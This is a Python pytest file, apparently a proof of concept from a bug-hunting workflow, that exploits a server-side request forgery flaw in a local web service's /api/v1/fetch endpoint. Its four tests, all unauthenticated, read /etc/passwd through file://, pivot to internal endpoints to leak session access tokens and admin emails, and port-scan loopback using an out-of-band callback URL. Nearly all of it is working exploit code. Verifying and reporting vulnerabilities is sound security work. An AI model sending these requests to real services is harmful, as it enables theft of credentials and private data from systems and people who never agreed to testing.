"""PoC: /api/v1/fetch SSRF -- unauth arbitrary scheme/destination fetch.

Target defect: GET /api/v1/fetch?url=ATTACKER_URL on 127.0.0.1:62395
  * no authentication required
  * no scheme allowlist      -> file:// local file read
  * no destination restriction -> pivot to internal/loopback services, port scan
Run: python3 -I -m pytest -q test_ssrf_fetch.py -s
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from p1hunt_dyn import Client

BASE = "http://127.0.0.1:62395"


def _fetch(c, url):
    r = c.get("/api/v1/fetch", params={"url": url})
    assert r.status == 200, r.status
    j = r.json()
    return j.get("preview"), j.get("error")


def test_unauth_file_scheme_local_file_read():
    """Unauthenticated attacker reads arbitrary local files via file://."""
    c = Client()  # no identity -> no Authorization header
    preview, err = _fetch(c, "file:///etc/passwd")
    assert err is None, f"unexpected error: {err}"
    assert preview and "root:" in preview, preview
    print("\n[file://] /etc/passwd leaked:\n", preview[:160])


def test_unauth_ssrf_internal_token_leak():
    """Unauth attacker pivots the fetcher to an internal endpoint and reads back
    the session accessToken/sessionToken in the preview body (token theft)."""
    c = Client()
    preview, err = _fetch(c, BASE + "/api/v1/session")
    assert err is None, err
    assert preview and "accessToken" in preview and "rng_" in preview, preview
    print("\n[ssrf] /api/v1/session tokens leaked via fetcher preview:\n", preview[:140])


def test_unauth_ssrf_admin_user_emails():
    """Unauth attacker pivots to /internal/admin/users and dumps admin emails/roles."""
    c = Client()
    preview, err = _fetch(c, BASE + "/internal/admin/users")
    assert err is None, err
    assert preview and "admin" in preview and "@example.invalid" in preview, preview
    print("\n[ssrf] admin users leaked:\n", preview[:160])


def test_ssrf_port_scan_open_vs_closed():
    """Fetcher is an SSRF port scanner: open port returns a body, closed returns
    a distinguishable connection-refused error."""
    c = Client()
    _, err_closed = _fetch(c, "http://127.0.0.1:1/")
    oob = os.environ["P1HUNT_OOB_URL"].rstrip("/") + "/scan"
    open_preview, _ = _fetch(c, oob)
    assert err_closed and "refused" in err_closed.lower(), err_closed
    assert open_preview == "ok", open_preview
    print("\n[ssrf] port scan: closed ->", err_closed, " open ->", open_preview)
